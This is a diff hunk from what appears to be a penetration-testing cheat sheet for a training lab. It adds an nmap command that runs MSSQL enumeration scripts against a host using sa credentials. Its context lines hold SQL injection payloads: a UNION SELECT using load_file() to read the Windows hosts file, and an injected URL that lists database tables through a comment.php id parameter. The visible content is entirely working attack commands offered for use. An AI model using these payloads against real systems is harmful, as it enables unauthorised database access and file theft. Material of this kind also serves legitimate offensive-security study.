@@ -195,6 +195,10 @@ Queries
 - Load file:  
   `union all select 1,2,3,4,load_file("c:/windows/system32/drivers/etc/hosts"),6` 
 
+MSSQL 
+- Nmap scripts with db credentials:  
+  `# nmap -n -Pn -p1433 --script "ms-sql-* and not ms-sql-brute" --script-args mssql.username=sa,mssql.password=<pw> 10.11.1.31`  
+  
 MySQL 
 - Enumerate tables:  
   `http://10.11.14.101/comment.php?id=769 union all select 1,2,3,4,table_name,6 FROM information_schema.tables` 
